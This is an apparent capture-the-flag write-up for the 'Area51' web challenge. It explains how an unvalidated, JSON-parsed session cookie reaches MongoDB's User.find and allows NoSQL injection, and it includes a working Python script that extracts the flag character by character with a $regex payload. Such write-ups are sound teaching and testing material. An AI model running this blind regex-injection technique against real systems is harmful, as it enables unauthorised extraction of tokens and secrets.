# AREA51

Challenge Description:

> Area51 Raid Luxury Consultation Services

> https://area51.chall.pwnoh.io

## Analyzing the website

We have a static page with login fields at the bottom. Seeing the source code, we know it is using `mongodb` nosql queries to authenticate us to the server.

The `/` endpoint in `routes/index.js` has a nosql injection opportunity as there is no validation done on the session token and it also parsed as JSON using the `JSON.parse` function. This token is directly being used in the `User.find` function.

We can use something like `{"$regex": "^bctf{"}` in the token value as the payload and keep incrementing the character till we get the whole flag. The User.find() function will return true as long as the regex is right.

The below dirty script tries to do the same and we get the flag.

```python
import requests

url = "https://area51.chall.pwnoh.io/"
success_snippet = "<marquee><h1>Thank you for understanding!</h1></marquee>"
# Not adding '+' and '*' as the $regex has different meanings for them
printable = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!&(),-=@^}~_'
flag = "bctf{"
status = 0
var = True

while(var):
    for char in printable:

        print(f"Trying char --> {char}")
        payload = f"{flag+char}"
        cookies = {'session' : '{{"token":{{"$regex": "^{}"}},"username":"jumpyWidgeon1"}}'.format(payload)}
        response = requests.get(url, cookies=cookies).text

        if success_snippet in response:
            flag += char
            print(f"Got flag --> {flag}")
            if char == "}":
                print(f"Flag done --> {flag}")
                status = 1
            break

    if(status):
        break
```

## References

1. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#extract-data-information